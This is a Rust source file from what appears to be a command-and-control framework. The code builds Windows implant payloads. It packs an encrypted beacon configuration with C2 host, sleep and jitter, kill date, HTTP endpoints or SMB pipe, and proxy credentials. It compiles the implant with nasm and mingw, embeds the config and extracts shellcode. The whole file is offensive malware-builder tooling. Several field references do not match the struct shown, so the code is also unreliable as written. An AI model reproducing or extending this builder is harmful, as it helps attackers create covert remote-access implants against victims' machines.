use std::env;
use std::fs;
use std::path::Path;
use std::str::FromStr;
use std::collections::HashMap;
use rayon::prelude::*;
use rand::Rng;

use crate::rstatic::{DEBUG_FLAGS, HASHES, INSTANCES, RELEASE_FLAGS, SESSION, STRINGS, USERAGENT};

use crate::stream::Stream;
use crate::error::{Error, Result};
use crate::cipher::{crypt_create_key, crypt_xtea};
use crate::binary::{copy_section_data, embed_section_data};
use crate::types::{Builder, Compiler, Config, JsonData, Loader, Network, NetworkOptions, NetworkType, UserSession};
use crate::utils::{canonical_path_all, generate_hashes, generate_object_path, normalize_path, run_command, wrap_message};
use crate::{log_debug, log_info};

pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
    if args.len() != 3 {
        return Err(Error::Custom("invalid arguments".to_string()))
    }

    log_info!(&"loading instance".to_string());

    let session = SESSION.lock()?;
    let mut instance = map_json_config(&args[2])?;

    instance.setup_build()?;
    instance.user_session.username = session.username.clone();
    instance.user_session.is_admin = session.is_admin.clone();

    wrap_message("info", &format!("{} is ready", instance.builder.output_name));
    INSTANCES.lock()?.push(instance);

    // todo: insert db
    Ok(())
}

pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
    // todo: remove from db
    if args.len() < 2 {
        return Err(Error::Custom("invalid arguments".to_string()))
    }

    let mut instances = INSTANCES.lock()?;
    if let Some(select) = instances
        .iter()
        .position(
            |instance| instance.builder.output_name == args[2]) {

        wrap_message("info", &format!("removing {}", instances[select].builder.output_name));
        instances.remove(select);

        Ok(())
    }
    else {
        Err(Error::Custom("Implant not found".to_string()))
    }
}

pub(crate) fn interact_instance(args: Vec<String>) -> Result<()> {
    // todo: implement
    Ok(())
}

fn map_json_config(file_path: &String) -> Result<Hexane> {
    let json_file = env::current_dir()?
        .join("json")
        .join(file_path);

    let contents = fs::read_to_string(json_file)
        .map_err(Error::Io)?;

    let json_data = serde_json::from_str::<JsonData>(&contents)?;

    let mut instance    = Hexane::default();
    let session         = SESSION.lock()?;

    instance.group_id       = 0;
    instance.main_cfg       = json_data.config;
    instance.loader_cfg     = json_data.loader;
    instance.builder_cfg    = json_data.builder;
    instance.network_cfg    = json_data.network;
    instance.user_session   = session.clone();

    Ok(instance)
}

#[derive(Debug, Default)]
pub struct Hexane {
    pub(crate) taskid:          u32,
    pub(crate) peer_id:         u32,
    pub(crate) group_id:        u32,
    pub(crate) build_type:      u32,
    pub(crate) session_key:     Vec<u8>,
    pub(crate) shellcode:       Vec<u8>,
    pub(crate) config_data:     Vec<u8>,
    pub(crate) active:          bool,
    pub(crate) main_cfg:        Config,
    pub(crate) builder_cfg:     Builder,
    pub(crate) compiler_cfg:    Compiler,
    pub(crate) network_cfg:     Option<Network>, // says "optional" but is checked for in the config
    pub(crate) loader_cfg:      Option<Loader>,
    pub(crate) user_session:    UserSession,
}

impl Hexane {
    fn setup_build(&mut self) -> Result<()> {
        let mut rng = rand::thread_rng();

        self.compiler_cfg.build_directory = format!("./payload/{}", self.builder_cfg.output_name);
        self.peer_id = rng.gen::<u32>();
        self.group_id = 0;

        self.compiler_cfg.compiler_flags = if self.main_cfg.debug {
            DEBUG_FLAGS.parse().unwrap()
        } else {
            RELEASE_FLAGS.parse().unwrap()
        };

        fs::create_dir_all(&self.compiler_cfg.build_directory)?;
        generate_hashes(STRINGS, HASHES)?;

        self.generate_config_bytes()?;
        self.compile_sources()?;

        Ok(())
    }

    fn generate_config_bytes(&mut self) -> Result<()> {
        self.session_key = crypt_create_key(16);

        let mut patch = self.create_binary_patch()?;
        let encrypt = self.main.encrypt;

        if encrypt {
            let patch_cpy = patch.clone();
            patch = crypt_xtea(&patch_cpy, &self.session_key, true)?;
        }

        self.config_data = patch;
        Ok(())
    }

    fn create_binary_patch(&mut self) -> Result<Vec<u8>> {
        let mut stream = Stream::new();

        if let Some(modules) = &self.builder.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        } else {
            log_debug!(&"no external module names found. continue.".to_owned());
        }

        let working_hours = if let Some(ref hours) = self.main.working_hours {
            i32::from_str(hours).map_err(|e| Error::Custom(format!("create_binary_patch::{e}")))?
        } else {
            0
        };

        let kill_date = if let Some(ref date) = self.main.killdate {
            i64::from_str(date).map_err(|e| Error::Custom(format!("create_binary_patch::{e}")))?
        } else {
            0
        };

        stream.pack_bytes(&self.session_key);
        stream.pack_string(&self.main.hostname);
        stream.pack_dword(self.peer_id);
        stream.pack_dword(self.main.sleeptime);
        stream.pack_dword(self.main.jitter as u32);
        stream.pack_int32(working_hours);
        stream.pack_dword64(kill_date);

        if let Some(network) = self.network.as_mut() {
            match (&network.r#type, &network.options) {
                (NetworkType::Http, NetworkOptions::Http(ref http)) => {
                    let useragent = http.useragent.as_ref().unwrap_or(&USERAGENT);

                    stream.pack_wstring(useragent);
                    stream.pack_wstring(&http.address);
                    stream.pack_dword(http.port as u32);
                    stream.pack_dword(http.endpoints.len() as u32);

                    for endpoint in &http.endpoints {
                        stream.pack_wstring(endpoint);
                    }
                    if let Some(ref domain) = http.domain {
                        stream.pack_string(domain);
                    }
                    if let Some(ref proxy) = http.proxy {
                        let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
                        stream.pack_dword(1);
                        stream.pack_wstring(&proxy_url);
                        stream.pack_wstring(proxy.username.as_ref().unwrap());
                        stream.pack_wstring(proxy.password.as_ref().unwrap());
                    } else {
                        stream.pack_dword(0);
                    }
                }

                (NetworkType::Smb, NetworkOptions::Smb(ref smb)) => {
                    stream.pack_wstring(smb.egress_pipe.as_ref().unwrap().as_str());
                }

                _ => return Err(Error::Custom("create_binary_patch: unknown network type".to_string())),
            }
        }

        Ok(stream.buffer)
    }

    pub fn compile_sources(&mut self) -> Result<()> {
        let src_path    = Path::new(&self.builder.root_directory).join("src");
        let output      = Path::new(&self.compiler.build_directory).join(&self.builder.output_name);

        let entries     = canonical_path_all(src_path)?;
        let config_data = self.config_data.clone();

        let includes    = self.generate_includes();
        let definitions = self.generate_definitions();

        let mut components  = Vec::new();

        for path in entries {
            let source      = normalize_path(path.to_str().unwrap().into());
            let mut command = String::new();
            let mut flags   = String::new();

            let object_file = generate_object_path(&source, Path::new(&self.compiler.build_directory));
            let object      = normalize_path(object_file.to_str().unwrap().into());


            match path.extension().and_then(|ext| ext.to_str()) {
                Some("asm") => {
                    command.push_str("nasm");
                    flags = format!(" -f win64 {} -o {}", source, object);

                    command.push_str(flags.as_str());
                    if let Err(e) = run_command(command.as_str(), "compiler_error") {
                        return Err(Error::Custom(format!("compile_sources::{e}")));
                    }

                    components.push(object);
                }

                Some("cpp") => {
                    components.push(source);
                }

                _ => {
                    continue;
                }
            }
        }

        let mut buffer  = Vec::new();

        if let Some(script) = &self.builder.linker_script {
            let path    = Path::new(&self.builder.root_directory).join(script);
            let lnk     = normalize_path(path.to_str().unwrap().into());

            buffer.push(format!(" -T {} ", lnk.as_str()));
        }

        let targets = components.join(" ");
        let linker  = buffer.join(" ");

        log_info!(&"linking final objects".to_string());
        run_command(&format!("{} {} {} {} {} {} -o {}.exe", "x86_64-w64-mingw32-g++".to_string(), includes, definitions, targets, linker, &self.compiler.compiler_flags, &output.to_str().unwrap()), "linker_error");

        if let Err(e) = embed_section_data(&format!("{}.exe", &output.to_str().unwrap()), &config_data, self.main.config_size as usize) {
            return Err(Error::Custom(format!("compile_sources::{e}")));
        }

        let mut shellcode: String = self.compiler.build_directory.to_owned();
        shellcode.push_str("/shellcode.bin");

        if let Err(e) = copy_section_data(&format!("{}.exe", &output.to_str().unwrap()), shellcode.as_str(), ".text") {
            return Err(Error::Custom(format!("compile_sources::{e}")));
        }

        // todo: extract shellcode
        // todo: create dll loader

        Ok(())
    }

    pub fn generate_definitions(&self) -> String {

        let mut defs: HashMap<String, Option<u32>> = HashMap::new();
        if self.main.debug {
            defs.insert("DEBUG".to_string(), None);
        }

        defs.insert("CONFIG_SIZE".to_string(), Some(self.main.config_size));
        defs.insert("ENCRYPTED".to_string(), Some(if self.main.encrypt { 1u32 } else { 0u32 }));
        defs.insert("BSWAP".to_string(), Some(if &self.main.architecture == "amd64" { 0u32 } else { 1u32 }));

        if let Some(network) = &self.network {
            match network.r#type {
                NetworkType::Http   => { defs.insert("TRANSPORT_HTTP".to_string(), None); }
                NetworkType::Smb    => { defs.insert("TRANSPORT_PIPE".to_string(), None); }
            }
        }

        defs.iter().map(|(name, def)| match def {
            None        => format!(" -D{} ", name),
            Some(value) => format!(" -D{}={} ", name, value),
        }).collect::<String>()
    }

    pub fn generate_includes(&self) -> String {
        let current = env::current_dir().unwrap().canonicalize().unwrap().to_str().unwrap().to_string();
        let normal  = normalize_path(normalize_path(current));

        let mut user_include    = vec![normal.to_string()];
        let mut includes        = vec![];


        if let Some(include) = self.builder.include_directories.clone() {
            let mut paths = vec![];

            for path in include {
                paths.push(normalize_path(path));
            }
            user_include.extend(paths);
        }

        for path in user_include.iter() {
            includes.push(format!(" -I\"{}\" ", path))
        }

        includes.join(" ")
    }
}